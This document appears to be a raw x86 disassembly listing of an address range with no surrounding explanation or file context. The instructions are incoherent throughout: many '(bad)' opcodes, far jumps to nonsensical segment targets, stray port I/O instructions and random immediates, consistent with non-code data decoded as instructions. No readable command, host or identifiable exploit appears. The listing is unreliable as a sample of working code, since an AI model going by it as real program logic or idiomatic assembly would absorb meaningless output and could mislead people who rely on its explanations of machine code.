  420fd9:	outs   dx,BYTE PTR ds:[esi]
  420fda:	dec    ebx
  420fdb:	leave  
  420fdc:	cmp    eax,0x96d38660
  420fe1:	test   al,0xab
  420fe3:	add    ecx,0x68
  420fe6:	pop    ds
  420fe7:	aas    
  420fe8:	es data16 jnp 0x420f6c
  420fec:	into   
  420fed:	inc    ebx
  420fee:	data16 lahf 
  420ff0:	adc    cl,ah
  420ff2:	ret    0x7a95
  420ff5:	scas   al,BYTE PTR es:[edi]
  420ff6:	scas   eax,DWORD PTR es:[edi]
  420ff7:	cmc    
  420ff8:	jmp    0x362ce079
  420ffd:	iret   
  420ffe:	imul   eax,DWORD PTR ds:0x43b28c8a,0xffffff95
  421005:	sbb    al,0x55
  421007:	mov    esp,0xbfa7ae44
  42100c:	jns    0x421000
  42100e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42100f:	test   BYTE PTR [edi+0x51c018bd],ch
  421015:	gs out dx,al
  421017:	jmp    0x421015
  421019:	lock cdq 
  42101b:	adc    BYTE PTR [edi],bl
  42101d:	out    dx,eax
  42101e:	div    BYTE PTR [eax-0x2edb338e]
  421024:	mov    edx,0x24dc436a
  421029:	(bad)  
  42102a:	fdiv   QWORD PTR [edx]
  42102c:	push   edi
  42102d:	cld    
  42102e:	push   esp
  42102f:	scas   al,BYTE PTR es:[edi]
  421030:	dec    edx
  421031:	cmp    eax,DWORD PTR [ecx-0x10]
  421034:	call   0xa1c:0xd633bab2
  42103b:	scas   eax,DWORD PTR es:[edi]
  42103c:	pop    edi
  42103d:	push   esp
  42103e:	imul   ebx,DWORD PTR [ebx],0xb260f085
  421044:	aaa    
  421045:	add    eax,0x4d2332c6
  42104a:	xor    BYTE PTR [edx],bl
  42104c:	neg    BYTE PTR [eax-0xa4c27d0]
  421052:	dec    ebp
  421053:	ja     0x421091
  421055:	ss add eax,0x85bb6b39
  42105b:	cld    
  42105c:	pop    ds
  42105d:	jns    0x420ff1
  42105f:	cs fwait
  421061:	xlat   BYTE PTR ds:[ebx]
  421062:	into   
  421063:	retf   0x3447
  421066:	pop    ds
  421067:	setnp  bl
  42106a:	push   es
  42106b:	js     0x421092
  42106d:	or     ebx,esi
  42106f:	mov    eax,ds:0xcfc282b8
  421074:	sub    edi,0x27
  421077:	push   esp
  421078:	and    BYTE PTR [ecx],al
  42107a:	inc    edx
  42107b:	sbb    esp,DWORD PTR [eax-0x2b1a208d]
  421081:	push   cs
  421082:	or     eax,DWORD PTR [esi+0x4ae4b870]
  421088:	sub    BYTE PTR [edi-0x648e2b3d],ah
  42108e:	scas   al,BYTE PTR es:[edi]
  42108f:	inc    edi
	...
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    es,WORD PTR [edx]
  421101:	push   ss
  421102:	add    BYTE PTR [ebp+0xc],dh
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	jl     0x421138
  42110e:	jno    0x4210ac
  421110:	xchg   edi,eax
  421111:	(bad)
  421114:	pop    ss
  421115:	rol    DWORD PTR [edi],1
  421117:	daa    
  421118:	sbb    dh,BYTE PTR [eax+0x7]
  42111b:	sbb    al,0x98
  42111d:	stc    
  42111e:	mov    ebp,0x536f4d83
  421123:	imul   ecx,DWORD PTR [edx+eiz*8-0x76908911],0x7fe3a51d
  42112e:	cmp    al,dl
  421130:	push   ss
  421131:	sub    eax,0x2ac28d38
  421136:	push   ecx
  421137:	push   ebx
  421138:	mov    esi,0x9ecdbb5f
  42113d:	add    DWORD PTR [ecx],ebx
  42113f:	inc    ebx
  421140:	repz push ecx
  421142:	sub    al,0xef
  421144:	ja     0x42117f
  421146:	and    BYTE PTR [ecx-0x16],0xf9
  42114a:	sub    DWORD PTR [edi-0x20],ebx
  42114d:	clc    
  42114e:	mov    ebx,0xc8d2b30f
  421153:	loope  0x421178
  421155:	fs test eax,edx
  421158:	shl    BYTE PTR [eax-0x50],0xab
  42115c:	out    0xf9,al
  42115e:	adc    eax,0x214d37d4
  421163:	and    eax,0xf4b8e587
  421168:	mov    bl,0x73
  42116a:	mov    eax,ds:0xa94be7c3
  42116f:	push   edi
  421170:	add    eax,0x86e9c03f
  421175:	cmp    BYTE PTR [edi+0x6d],0x70
  421179:	add    eax,0xc5c026e8
  42117e:	sbb    DWORD PTR [eax],ebp
  421180:	xchg   edx,eax
  421181:	fsub   st(1),st
  421183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421184:	push   eax
  421185:	sbb    BYTE PTR [edi+0x4e],ch
  421188:	das    
  421189:	push   esp
  42118a:	ds sahf 
  42118c:	cmp    esi,DWORD PTR [ebp+edx*4-0x28decc4b]
  421193:	mov    ds:0x290e58c4,eax
  421198:	pop    ebp
  421199:	stc    
  42119a:	adc    eax,0x3ecddea7
  42119f:	int    0x70
  4211a1:	out    0xd6,eax
  4211a3:	stos   BYTE PTR es:[edi],al
  4211a4:	pop    edi
  4211a5:	out    0x94,al
  4211a7:	gs adc eax,0x60021ae0
  4211ad:	into   
  4211ae:	xor    ebx,DWORD PTR [edi]
  4211b0:	push   esp
  4211b1:	std    
  4211b2:	adc    eax,0x25a7374f
  4211b7:	inc    ecx
  4211b8:	mov    ds:0xd00a02b8,eax
  4211bd:	jmp    0x61fa405e
  4211c2:	cmp    al,0x47
  4211c4:	pop    ds
  4211c5:	sbb    ebp,DWORD PTR es:[ebx-0x2ff69581]
  4211cc:	jno    0x42121f
  4211ce:	push   0x5a
  4211d0:	lea    ebp,[edi+eax*2]
  4211d3:	sbb    eax,0xd78dee6f
  4211d8:	jmp    0xa0cf:0x147f09fe
  4211df:	repz add bl,BYTE PTR [eax+0x36]
  4211e3:	dec    esp
  4211e4:	(bad)  
  4211e5:	jmp    0xbf3637fa
  4211ea:	adc    cl,bh
  4211ec:	cld    
  4211ed:	xchg   edx,eax
  4211ee:	push   esi
  4211ef:	or     esp,DWORD PTR [ecx]
  4211f1:	push   0x36c2adb8
  4211f6:	xor    al,0xb1
  4211f8:	(bad)  
  4211f9:	mov    eax,0xe3f4cf3f
  4211fe:	hlt    
  4211ff:	mov    bh,0x18
  421201:	xor    DWORD PTR [ebx-0x5],eax
  421204:	cmp    ch,bl
  421206:	imul   ebp,ecx,0xf011710e
  42120c:	test   DWORD PTR [edx+0x9c85],eax
	...
  421272:	add    BYTE PTR [eax],al
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0xa27ab32d
  421281:	jecxz  0x42129d
  421283:	mov    al,0x10
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    al,0x1
  42128a:	add    BYTE PTR [eax],al
  42128c:	rol    eax,1
  42128e:	mov    al,ds:0x221b5407
  421293:	cmp    esp,DWORD PTR [ebx]
  421295:	pop    ss
  421296:	ins    BYTE PTR es:[edi],dx
  421297:	jo     0x42128e
  421299:	xchg   ebp,eax
  42129a:	cmp    eax,0x63f949c9
  42129f:	push   edi
  4212a0:	ret    0x68bb
  4212a3:	and    ecx,DWORD PTR [ecx-0x54b059ab]
  4212a9:	xchg   DWORD PTR [edx],ebx
  4212ab:	xchg   edi,eax
  4212ac:	stos   BYTE PTR es:[edi],al
  4212ad:	fdivr  st(5),st
  4212af:	stos   BYTE PTR es:[edi],al
  4212b0:	dec    eax
  4212b1:	mov    esp,DWORD PTR [esi-0x4d]
  4212b4:	shr    BYTE PTR [esi+0x57],1
  4212b7:	shl    DWORD PTR [esi+0x34436d74],0x5c
  4212be:	push   esp
  4212bf:	shr    dh,0xda
  4212c2:	popf   
  4212c3:	idiv   BYTE PTR [edi-0x7aec554f]
  4212c9:	lock scas al,BYTE PTR es:[edi]
  4212cb:	dec    ebp
  4212cc:	cld    
  4212cd:	mov    bh,0x91
  4212cf:	(bad)  
  4212d1:	dec    edx
  4212d2:	mov    ebp,0x3d9bac23
  4212d7:	sub    edx,DWORD PTR [edx-0x2]
  4212da:	pop    es
  4212db:	stc    
  4212dc:	fidiv  WORD PTR [ecx]
  4212de:	dec    ecx
  4212df:	rcl    edx,0x7c
  4212e2:	dec    ecx
  4212e3:	jns    0x42133e
  4212e5:	fisubr WORD PTR [edx-0x2b23ade1]
  4212eb:	(bad)  
  4212ec:	or     DWORD PTR [esi-0x61e86906],esi
  4212f2:	sbb    DWORD PTR [eax+0x62d5ae79],0x7
  4212f9:	dec    ebx
  4212fa:	lods   al,BYTE PTR ds:[esi]
  4212fb:	clc    
  4212fc:	js     0x4212e8
  4212fe:	in     eax,0xf3
  421300:	lea    eax,[edi]
  421302:	and    dh,BYTE PTR [esi-0x12cff650]
  421308:	sbb    eax,0x474a8884
  42130d:	xchg   esi,eax
  42130e:	pop    ss
  42130f:	mov    DWORD PTR [eax+0x269defde],edx
  421315:	add    al,0xd7
  421317:	cli    
  421318:	sar    BYTE PTR [esi-0x3c8c87b9],1
  42131e:	adc    edi,edx
  421320:	inc    esp
  421321:	add    esp,ecx
  421323:	pop    edi
  421324:	leavew 
  421326:	aaa    
  421327:	xchg   ecx,eax
  421328:	test   BYTE PTR [ebp-0x54da41e],ch
  42132e:	int    0x54
  421330:	call   FWORD PTR [eax]
  421332:	rcr    BYTE PTR [ecx],1
  421334:	stc    
  421335:	push   edi
  421336:	dec    esp
  421337:	scas   eax,DWORD PTR es:[edi]
  421338:	arpl   WORD PTR [ebx*2-0x274c01ae],cx
  42133f:	jne    0x42131f
  421341:	pop    ebx
  421342:	pop    ecx
  421343:	mov    ds:0xbf932375,eax
  421348:	push   esi
  421349:	mov    ebx,0xaa897cdc
  42134e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42134f:	ins    BYTE PTR es:[edi],dx
  421350:	fnsave [eax-0x3f]
  421353:	and    eax,0xc73cd0f1
  421358:	mov    ch,0x2c
  42135a:	sub    BYTE PTR [edx+edx*4-0x25359d36],al
  421361:	push   es
  421362:	(bad)  
  421363:	add    eax,0x8b421c3a
  421368:	cmp    BYTE PTR [ecx-0x3d],dh
  42136b:	jae    0x421387
  42136d:	fstp   DWORD PTR [edi]
  42136f:	mov    dl,0x73
  421371:	jae    0x421317
  421373:	aad    0x7e
  421375:	xor    BYTE PTR [ebx-0xe0b1367],al
  42137b:	ja     0x4213ee
  42137d:	mov    edx,0xe2957b69
  421382:	stos   BYTE PTR es:[edi],al
  421383:	xor    dl,bl
  421385:	(bad)  
  421386:	jnp    0x42135e
  421388:	arpl   WORD PTR cs:[edx],cx
  42138b:	ins    DWORD PTR es:[edi],dx
  42138c:	dec    esi
  42138d:	or     al,dh
  42138f:	add    al,0x0
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x17eb0b61]
  421402:	aam    0x56
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	adc    al,0x7a
  42140e:	int    0x9d
  421410:	xchg   edi,eax
  421411:	aas    
  421412:	nop
  421413:	shl    DWORD PTR [edi+0x24],cl
  421416:	xor    eax,0x64102f2b
  42141b:	or     eax,0xe52762e8
  421420:	int    0x73
  421422:	mov    dl,0xf2
  421424:	ins    BYTE PTR es:[edi],dx
  421425:	push   ebp
  421426:	mov    bh,0x12
  421428:	and    eax,0x362c1bfa
  42142d:	setne  BYTE PTR [esi-0x448ca9f4]
  421434:	or     BYTE PTR [ebx+0x7e],0xbf
  421438:	pop    ss
  421439:	mov    esi,0xd3122f3a
  42143e:	push   es
  42143f:	inc    eax
  421440:	xchg   ebp,eax
  421441:	imul   ecx,DWORD PTR [edx],0x82e247fa
  421447:	aam    0x5e
  421449:	repnz push edi
  42144b:	frstor [esi]
  42144d:	mov    al,0x53
  42144f:	mov    BYTE PTR [edx-0x72],ch
  421452:	enter  0xd02e,0xee
  421456:	push   cs
  421457:	cmp    al,0x1d
  421459:	pop    esi
  42145a:	push   esp
  42145b:	arpl   WORD PTR [esi+0x57c485f8],bp
  421461:	cwde   
  421462:	xor    al,0x40
  421464:	enter  0xa939,0x68
  421468:	push   ds
  421469:	in     eax,0x80
  42146b:	xor    eax,0x650311b5
  421470:	leave  
  421471:	sub    ch,dl
  421473:	repz sbb BYTE PTR [edi],bl
  421476:	clc    
  421477:	dec    ecx
  421478:	add    ecx,DWORD PTR [edx-0x6c]
  42147b:	pop    ss
  42147c:	frstor [edi+eiz*2]
  42147f:	or     bl,dh
  421481:	enter  0x8a53,0x1d
  421485:	push   es
  421486:	add    al,BYTE PTR [ebp+0x159051d2]
  42148c:	jle    0x421425
  42148e:	imul   edx,DWORD PTR [esi+0x53036a18],0x2675bd03
  421498:	je     0x42147f
  42149a:	dec    eax
  42149b:	xlat   BYTE PTR ds:[ebx]
  42149c:	xchg   esp,eax
  42149d:	inc    ecx
  42149e:	rcr    esi,1
  4214a0:	inc    DWORD PTR [esi]
  4214a2:	pop    edi
  4214a3:	into   
  4214a4:	jo     0x4214af
  4214a6:	(bad)  
  4214a7:	(bad)  
  4214a8:	jp     0x421481
  4214aa:	inc    edi
  4214ab:	inc    ecx
  4214ac:	sub    bh,dl
  4214ae:	xchg   esi,eax
  4214af:	push   es
  4214b0:	int    0xd8
  4214b2:	dec    edi
  4214b3:	mov    ebx,ecx
  4214b5:	jno    0x4214d5
  4214b7:	sahf   
  4214b8:	call   0xb249:0xafeb6c48
  4214bf:	mov    dl,0x5f
  4214c1:	out    dx,eax
  4214c2:	sbb    ch,dl
  4214c4:	lods   al,BYTE PTR ds:[esi]
  4214c5:	(bad)  
  4214c6:	or     al,0xea
  4214c8:	test   BYTE PTR [edi+0x73345055],al
  4214ce:	test   DWORD PTR [eax+0x6b],ecx
  4214d1:	stos   DWORD PTR es:[edi],eax
  4214d2:	pop    esi
  4214d3:	xchg   edx,eax
  4214d4:	shr    edi,0x3a
  4214d7:	jmp    0x1921c757
  4214dc:	sbb    eax,esp
  4214de:	stos   DWORD PTR es:[edi],eax
  4214df:	jnp    0x421472
  4214e1:	out    0x91,eax
  4214e3:	leave  
  4214e4:	scas   al,BYTE PTR es:[edi]
  4214e5:	pusha  
  4214e6:	push   esi
  4214e7:	loop   0x421528
  4214e9:	mov    ebx,0x4d4cca4e
  4214ee:	ror    BYTE PTR [eax+0x47c83447],1
  4214f4:	xchg   esp,eax
  4214f5:	loop   0x421524
  4214f7:	add    al,0x13
  4214f9:	mov    ds:0xb940ffcc,eax
  4214fe:	rol    BYTE PTR [ecx-0x79],1
  421501:	dec    ebp
  421502:	jo     0x4214ce
  421504:	mov    eax,0xc9c40121
  421509:	push   cs
  42150a:	sbb    al,0x54
  42150c:	jbe    0x4214b7
  42150e:	sahf   
  42150f:	cmp    eax,DWORD PTR [eax]
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x65d942b4],bp
  421582:	push   esi
  421583:	outs   dx,BYTE PTR ds:[esi]
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	adc    cl,BYTE PTR [eax*8+0x33e8ddcb]
  421593:	and    eax,0xe664b881
  421598:	loop   0x4215f4
  42159a:	pop    ebp
  42159b:	shl    DWORD PTR [ecx+0x2cae868e],cl
  4215a1:	mov    al,0xbd
  4215a3:	inc    ebp
  4215a4:	lods   eax,DWORD PTR ds:[esi]
  4215a5:	sub    al,0x84
  4215a7:	std    
  4215a8:	xchg   edx,eax
  4215a9:	mov    edi,0xf36da2c1
  4215ae:	(bad)  
  4215af:	int3   
  4215b0:	seta   BYTE PTR [edi+0x6a]
  4215b4:	(bad)  
  4215b5:	pop    edi
  4215b6:	nop
  4215b7:	mov    ah,0xad
  4215b9:	jmp    0x4c16:0xface5884
  4215c0:	in     al,0x6a
  4215c2:	outs   dx,DWORD PTR ds:[esi]
  4215c3:	push   esi
  4215c4:	mov    bh,0x3
  4215c6:	pushf  
  4215c7:	cdq    
  4215c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215c9:	and    DWORD PTR [esi+eax*2+0x4889e984],ebx
  4215d0:	sbb    bh,BYTE PTR [eax]
  4215d2:	rcr    cl,0xa3
  4215d5:	ja     0x421625
  4215d7:	popf   
  4215d8:	mov    al,ds:0x73787033
  4215dd:	jge    0x4215b9
  4215df:	mov    ch,0x83
  4215e1:	cmp    bh,BYTE PTR [eax]
  4215e3:	mov    DWORD PTR [ebp+0x87e2ab2],ecx
  4215e9:	jecxz  0x421586
  4215eb:	sbb    edi,eax
  4215ed:	clc    
  4215ee:	jmp    0x42165d
  4215f0:	mul    BYTE PTR [ebx]
  4215f2:	cli    
  4215f3:	fsub   DWORD PTR [eax+0x5ad84a65]
  4215f9:	pushf  
  4215fa:	inc    esp
  4215fb:	or     eax,0x239c1bd
  421600:	aas    
  421601:	(bad)  
  421602:	pop    esi
  421603:	jbe    0x421610
  421605:	add    DWORD PTR [ecx-0x1a0d28fd],eax
  42160b:	in     eax,dx
  42160c:	sar    BYTE PTR [edx-0x15a0dd6b],1
  421612:	arpl   WORD PTR [esi-0xa],di
  421615:	in     al,dx
  421616:	mov    edi,edx
  421618:	adc    DWORD PTR [ebx],0xffffff93
  42161b:	test   eax,ebx
  42161d:	cmp    dh,0xe7
  421620:	push   es
  421621:	aam    0x1e
  421623:	jne    0x421688
  421625:	xor    BYTE PTR [edi],bl
  421627:	pusha  
  421628:	mov    eax,ds:0xaa05f33a
  42162d:	jmp    0x9bce:0xdd5d63eb
  421634:	xchg   ecx,eax
  421635:	leave  
  421636:	inc    ecx
  421637:	push   eax
  421638:	bound  ebp,QWORD PTR [edx-0x43d525fb]
  42163e:	cmc    
  42163f:	xor    DWORD PTR [edi-0x27],edx
  421642:	ds call 0xd348:0xa292cdb5
  42164a:	icebp  
  42164b:	lahf   
  42164c:	pusha  
  42164d:	(bad)  
  42164e:	xor    ebx,DWORD PTR [eax]
  421650:	cmc    
  421651:	(bad)  
  421652:	sbb    eax,0x88b318b8
  421657:	stos   DWORD PTR es:[edi],eax
  421658:	cmc    
  421659:	pop    ss
  42165a:	jbe    0x4216b6
  42165c:	or     DWORD PTR cs:[ecx+0x54166b19],eax
  421663:	lds    edx,FWORD PTR [edx+0x13675bf3]
  421669:	lea    ecx,[ecx-0x79]
  42166c:	outs   dx,DWORD PTR ds:[esi]
  42166d:	aas    
  42166e:	retf   
  42166f:	and    al,0xbd
  421671:	cs push cs
  421673:	cmp    eax,0x79a7060c
  421678:	mov    ch,0x40
  42167a:	arpl   sp,bp
  42167c:	imul   esi,DWORD PTR [esi+ebp*8-0x38],0x44
  421681:	adc    eax,0x5013927a
  421686:	(bad)  
  421687:	cmp    esp,edi
  421689:	xor    BYTE PTR [ecx-0x12ce0ee4],ah
  42168f:	pop    esi
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	inc    ebp
  421701:	sub    eax,0x641cb1ac
  421706:	add    DWORD PTR [eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	bound  ebp,QWORD PTR [edi+0x3c2c3777]
  421712:	dec    ebx
  421713:	outs   dx,BYTE PTR ds:[esi]
  421714:	mov    ch,0x33
  421716:	and    eax,0xb922b52
  42171b:	inc    eax
  42171c:	inc    ebp
  42171d:	pop    ecx
  42171e:	inc    ebp
  42171f:	mov    ds:0x21069da9,al
  421724:	inc    ebp
  421725:	ret    
  421726:	mov    ebp,0x76e6dfb6
  42172b:	je     0x421706
  42172d:	aaa    
  42172e:	mov    dh,0x16
  421730:	mov    esi,0xb85cd1c5
  421735:	loope  0x4217a7
  421737:	and    eax,0xe0011552
  42173c:	cmp    eax,0xd23db8f3
  421741:	in     al,0x81
  421743:	cmp    DWORD PTR gs:[edi-0x7c],eax
  421747:	add    BYTE PTR [ebx+0xeb9516d],bl
  42174d:	mov    ah,ah
  42174f:	jns    0x42178b
  421751:	push   0xffffffad
  421753:	loope  0x42173c
  421755:	test   bh,dl
  421757:	jmp    0x6a3a:0x8109d4bb
  42175e:	(bad)  
  42175f:	aas    
  421760:	fld    DWORD PTR [esi-0x103d5d46]
  421766:	es mov edi,0x4033dc3a
  42176c:	push   esi
  42176d:	enter  0x3f52,0x2d
  421771:	jle    0x421720
  421773:	dec    ebx
  421774:	fistp  WORD PTR [esi-0x5866dcf4]
  42177a:	add    DWORD PTR [esi-0x35fe5ec5],0xffffffbe
  421781:	and    edx,ecx
  421783:	sub    DWORD PTR [ebx-0x3c],esp
  421786:	push   ebp
  421787:	mov    eax,ds:0x8d7342a4
  42178c:	fimul  DWORD PTR [edi]
  42178e:	clc    
  42178f:	div    BYTE PTR [ecx-0xe]
  421792:	out    0xaa,al
  421794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421795:	xchg   DWORD PTR [edi-0x3055203d],ebp
  42179b:	sti    
  42179c:	mov    DWORD PTR [ebx],ebx
  42179e:	mov    ds:0xd90cac07,al
  4217a3:	push   ebx
  4217a4:	jle    0x421789
  4217a6:	inc    DWORD PTR [edi]
  4217a8:	cmp    ebx,DWORD PTR [esi-0x3dfd37c0]
  4217ae:	(bad)  [edx]
  4217b0:	inc    esi
  4217b1:	jbe    0x4217d2
  4217b3:	mov    esp,0x7a478fb8
  4217b8:	(bad)  
  4217b9:	dec    esi
  4217ba:	sbb    ch,BYTE PTR ds:0x483c4871
  4217c0:	xchg   edx,eax
  4217c1:	jmp    0x42176a
  4217c3:	ret    
  4217c4:	or     BYTE PTR [eax+ecx*1],cl
  4217c7:	mov    esi,0xe33e2029
  4217cc:	xor    ch,BYTE PTR cs:[ecx+0x4114155c]
  4217d3:	sub    eax,DWORD PTR [ebp+0x544d99ba]
  4217d9:	aas    
  4217da:	push   ebx
  4217db:	sbb    BYTE PTR [edi],0x15
  4217de:	test   BYTE PTR [ebx-0x2856a3c1],bl
  4217e4:	lds    edi,FWORD PTR [eax-0x50b38e5c]
  4217ea:	lahf   
  4217eb:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217ed:	in     al,dx
  4217ee:	cwde   
  4217ef:	jbe    0x421870
  4217f1:	adc    eax,0x9b0360cf
  4217f6:	mov    DWORD PTR [ebx-0x3b69620b],esp
  4217fc:	stos   BYTE PTR es:[edi],al
  4217fd:	xor    eax,DWORD PTR [edx-0x2f8599e2]
  421803:	xchg   esp,eax
  421804:	data16 xchg ah,ch
  421807:	sbb    eax,0x6427e709
  42180c:	inc    esp
  42180d:	ja     0x421814
  42180f:	fild   WORD PTR [eax]
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	or     edi,DWORD PTR [ecx-0x74]
  421883:	in     al,dx
  421884:	and    BYTE PTR [ebp+0x1],ah
  421887:	add    BYTE PTR [ecx+eax*1],al
  42188a:	add    BYTE PTR [eax],al
  42188c:	(bad)  fs:[eax-0x1f866e27]
  421893:	xchg   ecx,eax
  421894:	jae    0x421907
  421896:	repnz adc BYTE PTR [esi+0x2b],ah
  42189a:	xor    cl,BYTE PTR [esi+eiz*1-0x2f]
  42189e:	or     eax,0xd693f094
  4218a3:	and    BYTE PTR [ebx],cl
  4218a5:	xchg   esi,eax
  4218a6:	out    0xc9,al
  4218a8:	test   ebx,esp
  4218aa:	dec    ebx
  4218ab:	ret    
  4218ac:	(bad)
  4218af:	loop   0x421853
  4218b1:	pop    ds
  4218b2:	shl    DWORD PTR [esi-0x38],cl
  4218b5:	adc    BYTE PTR [ecx-0x24556143],dh
  4218bb:	push   cs
  4218bc:	je     0x4218fb
  4218be:	add    DWORD PTR [esi],esi
  4218c0:	into   
  4218c1:	stos   BYTE PTR es:[edi],al
  4218c2:	xchg   esp,eax
  4218c3:	cld    
  4218c4:	sbb    BYTE PTR [esi+0x4db31d77],dh
  4218ca:	loop   0x4218bb
  4218cc:	aaa    
  4218cd:	sub    dl,dl
  4218cf:	mov    edi,0xd0dd69a
  4218d4:	push   ebx
  4218d5:	iret   
  4218d6:	push   ebx
  4218d7:	leave  
  4218d8:	mov    cl,0x5a
  4218da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218db:	stos   BYTE PTR es:[edi],al
  4218dc:	add    ecx,esi
  4218de:	repnz cmp DWORD PTR [ecx-0x10],0x3c09e249
  4218e6:	push   es
  4218e7:	ret    0xeee7
  4218ea:	scas   eax,DWORD PTR es:[edi]
  4218eb:	in     eax,dx
  4218ec:	mov    bl,0x7d
  4218ee:	int3   
  4218ef:	or     BYTE PTR ds:0x872ef2eb,0xad
  4218f6:	popa   
  4218f7:	and    BYTE PTR [edi-0x35],dh
  4218fa:	popa   
  4218fb:	push   esp
  4218fc:	js     0x421924
  4218fe:	adc    BYTE PTR [ecx+eax*2-0x32],0x22
  421903:	in     eax,dx
  421904:	mov    esi,0x2202338f
  421909:	sub    BYTE PTR [ebx],al
  42190b:	or     DWORD PTR [ecx-0xe43ddf2],esi
  421911:	or     eax,0xd7b2384c
  421916:	dec    BYTE PTR [ebx-0x552c838a]
  42191c:	xlat   BYTE PTR ds:[ebx]
  42191d:	cmc    
  42191e:	xchg   edi,eax
  42191f:	xchg   esp,eax
  421920:	mov    bh,0x1f
  421922:	or     bl,BYTE PTR [ebp-0x65]
  421925:	outs   dx,BYTE PTR ds:[esi]
  421926:	push   ebp
  421927:	push   cs
  421928:	inc    esp
  421929:	idiv   edi
  42192b:	dec    ebx
  42192c:	(bad)  
  42192d:	(bad)  
  42192e:	xlat   BYTE PTR ds:[ebx]
  42192f:	mov    WORD PTR [ecx-0x27],?
  421932:	outs   dx,BYTE PTR ds:[esi]
  421933:	in     eax,dx
  421934:	clc    
  421935:	adc    BYTE PTR [edi],0xae
  421938:	test   BYTE PTR [edi*2+0x7c98ffdc],bh
  42193f:	(bad)  
  421940:	and    ebx,DWORD PTR [edx]
  421942:	push   0xffffff96
  421944:	or     al,0xa3
  421946:	stc    
  421947:	retf   0x4951
  42194a:	in     eax,dx
  42194b:	dec    eax
  42194c:	jecxz  0x42192f
  42194e:	mov    al,ds:0xda1cb636
  421953:	jbe    0x42196f
  421955:	int    0x46
  421957:	test   al,0xd8
  421959:	scas   al,BYTE PTR es:[edi]
  42195a:	and    BYTE PTR [esp+eiz*2-0x4a],ch
  42195e:	mov    ebp,0x4cb44802
  421963:	mov    cl,0xcf
  421965:	mov    eax,0x44b7d998
  42196a:	fwait
  42196b:	js     0x42191d
  42196d:	in     eax,dx
  42196e:	cmp    al,0x9
  421970:	push   ds
  421971:	mov    dl,0x95
  421973:	fmul   QWORD PTR [ecx]
  421975:	xchg   edx,eax
  421976:	mov    edi,0x7f911185
  42197b:	dec    ebp
  42197c:	(bad)  
  42197d:	jbe    0x4219c8
  42197f:	mov    bl,0x10
  421981:	(bad)  
  421983:	inc    ecx
  421984:	mov    edx,0x5dc21124
  421989:	mov    ah,0xe9
  42198b:	push   esi
  42198c:	out    0x74,al
  42198e:	push   esp
  42198f:	fadd   QWORD PTR [eax]
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	mov    ch,0x1c
  421a02:	push   cs
  421a03:	jg     0x421a29
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	and    edi,DWORD PTR [edi-0x13ba1394]
  421a12:	ds mov bh,0xa2
  421a15:	repnz sub eax,0xd8954b02
  421a1b:	cmp    edx,DWORD PTR [eax]
  421a1d:	cld    
  421a1e:	xchg   edi,eax
  421a1f:	test   BYTE PTR [ebx],dl
  421a21:	cwde   
  421a22:	lods   al,BYTE PTR ds:[esi]
  421a23:	xchg   ebx,eax
  421a24:	es int 0x0
  421a27:	loopne 0x421a84
  421a29:	dec    edx
  421a2a:	int3   
  421a2b:	cmp    esi,DWORD PTR [ecx+0x4c]
  421a2e:	bound  esi,QWORD PTR [ecx+0x1772ca71]
  421a34:	push   esi
  421a35:	mov    eax,ds:0xe68e916d
  421a3a:	mov    dh,0xa
  421a3c:	sahf   
  421a3d:	xor    dl,BYTE PTR [ebx+0x72ef945d]
  421a43:	xor    al,0x94
  421a45:	inc    esi
  421a46:	dec    ebp
  421a47:	shr    BYTE PTR [eax+edi*1],0x9
  421a4b:	stos   BYTE PTR es:[edi],al
  421a4c:	xchg   edi,eax
  421a4d:	outs   dx,BYTE PTR ds:[esi]
  421a4e:	je     0x421a8d
  421a50:	scas   al,BYTE PTR es:[edi]
  421a51:	ins    DWORD PTR es:[edi],dx
  421a52:	mov    eax,ds:0xc810bdbb
  421a57:	cli    
  421a58:	mov    BYTE PTR [edi-0xe],bl
  421a5b:	cmp    al,0xed
  421a5d:	dec    edx
